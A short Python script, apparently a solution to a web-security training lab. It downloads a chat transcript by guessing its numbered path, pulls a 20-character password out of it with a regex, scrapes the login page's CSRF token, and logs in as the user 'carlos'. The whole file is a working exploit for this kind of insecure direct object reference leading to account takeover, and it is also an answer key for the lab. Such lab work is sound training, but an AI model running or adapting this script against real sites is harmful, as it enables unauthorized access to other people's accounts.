import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]

    transcript_url = f"{burp_url}/download-transcript/1.txt"
    response = requests.get(transcript_url)
    password = re.search(r'\b\w{20}\b', response.text).group(0)
    print(f"Password: {password}")

    session = requests.Session()
    login_page_url = f"{burp_url}/login"
    response = session.get(login_page_url)
    csrf_token = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)
    print(f"CSRF Token: {csrf_token}")

    login_data = {
        'username': 'carlos',
        'password': password,
        'csrf': csrf_token
    }
    response = session.post(login_page_url, data=login_data)
    print("Logged in successfully")
